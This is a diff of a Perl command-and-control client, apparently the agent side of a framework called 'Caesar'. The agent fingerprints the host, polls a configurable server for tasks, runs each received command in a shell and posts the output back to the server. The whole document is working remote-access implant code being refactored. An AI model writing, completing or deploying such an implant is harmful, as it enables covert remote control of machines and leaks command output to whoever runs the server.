@@ -1,5 +1,5 @@
 #!/usr/bin/perl
-# TOCHECK:  perl -e 'open(P, "| kate &"); while(<P>) { print $_; } close P; print "lol\n";' 
+# TOCHECK:  perl -e 'open(P, "| kate &"); while() { print $_; } close P; print "lol\n";' 
 
 use 5.10.0;
 
@@ -18,7 +18,7 @@ use URI::Escape;
 use UUID::Generator::PurePerl;
 
 # Replace with your URL/IP
-my $caesar_folder = '<CAESAR_URL>';
+my $caesar_folder = '__CAESAR-URL__';
 
 # Getting information from the system
 my $hostname = `uname -n`;
@@ -51,8 +51,7 @@ for(my $i = 0; $i < 0+@chars; $i++) {
     $mac .= ':' if($i%2 && $chars[$i+1]);
 }
 
-my $working_directory = `pwd`;
-chomp $working_directory;
+my $working_directory = $CWD;
 
 # Generating unique id
 my $unique_id = md5("$mac$operating_system$arch");
@@ -69,7 +68,7 @@ my $cookie_jar = HTTP::Cookies->new(
 
 # Browser object
 my $browser = LWP::UserAgent->new();
-$browser->timeout(10);
+$browser->timeout(15);
 $browser->protocols_allowed( [qw( http https ftp ftps )] );
 $browser->requests_redirectable(['GET', 'POST', 'HEAD', 'OPTIONS']);
 $browser->cookie_jar($cookie_jar);
@@ -100,7 +99,7 @@ sub split_response {
     
     my @output = ();
     my @tmp = split($start_separator, $response->content);
-
+    
     foreach my $part (@tmp) {
         if($part =~ /$end_separator/i) {
             my @subparts = split($end_separator, $part);
@@ -164,7 +163,7 @@ while(1) {
     
     # Check if there are new commands to execute
     my $response = send_data($caesar_folder . '/target/tasks.php', "unique_id=" . $unique_id);
-
+    
     # If the response from the server is not empty
     if($response->content) {
         # Splitting the response in order to get a list of commands to execute (and their identifiers)
@@ -179,23 +178,27 @@ while(1) {
             $task_id = $ids[$i] if($ids[$i]);
             
             my $process = {
+                'post_url' => $caesar_folder . '/target/output.php',
                 'command' => $command,
                 'task_id' => $task_id,
-                'wd' => 0,
+                'wd' => $CWD,
+                'delay' => 1,
+                'post_data' => 0,
                 'output' => 0,
+                'status' => 0,
             };
             
             given($command)
             {
                 # If the user want a remote pseudo-connection
                 when(/^connect$/i) {
-                    $delay = 1;
-                    $output = 'connected';
+                    $process->{delay} = 1;
+                    $process->{output} = 'connected';
                 }
                 
                 when(/^exit$/i) {
-                    $delay = 10;
-                    $output = 'exit';
+                    $process->{delay} = 1;
+                    $process->{output} = 'exit';
                 }
                 
                 when(/^cd /i) {
@@ -204,39 +207,40 @@ while(1) {
                     $working_directory = $CWD;
                     eval {
                         $CWD = $directory;
-                    }
+                    };
                     
                     if($@) {
-                        $output = "Warning: Couldn't Move To : $directory\n";
+                        $process->{output} = "Warning: Couldn't Move To : $directory\n";
                         $CWD = $working_directory;
                     } else {
-                        $output = "Working Directory : $directory\n";
+                        $process->{output} = "Working Directory : $directory\n";
+                        $CWD = $directory;
                     }
                 }
                 
                 # If the user want a remote pseudo-connection
                 default {
-                    my $status = 0;
-                    ($output, $status) = execute_command($command);
-                    chomp $output;
-                    $output = "[ERROR] " . $output if($status); # Status = 0 => no error / status = 2 => error
-                    
+                    my ($out, $status) = execute_command($command);
+                    chomp $out;
+                    if(!$status) {
+                        $process->{output} = $out;
+                    } else {
+                        $process->{output} = "[ERROR] " . $out;
+                        # Status = 0 => no error / status = 2 => error
+                    }
                     # TODO: Really usefull ?!
                     my @new_subprocess = ();
                     push(@new_subprocess, $process);
                     
-                    # Time for the subprocess to spawn
-                    sleep (0.5);
+                    sleep(0.5);
                 }
             }
-            $process->{output} = $output;
-            $process->{wd} = $CWD;
             
             # Send the output to the server
-            my $data = "unique_id=" . $unique_id . '&command=' . uri_escape($process->{command}) . '&task_id=' . $process->{task_id} . '&output=' . uri_escape($process->{output}) . '&wd=' . uri_escape($process->{wd});
-            send_data($caesar_folder . '/target/output.php', $data);
+            $process->{post_data} = "unique_id=" . $unique_id . '&command=' . uri_escape($process->{command}) . '&task_id=' . $process->{task_id} . '&output=' . uri_escape($process->{output}) . '&wd=' . uri_escape($process->{wd});
+            send_data($process->{post_url}, $process->{post_data});
             
-            sleep ($delay);
+            sleep($process->{delay});
         }
     } else {
         my $no_response = 0;
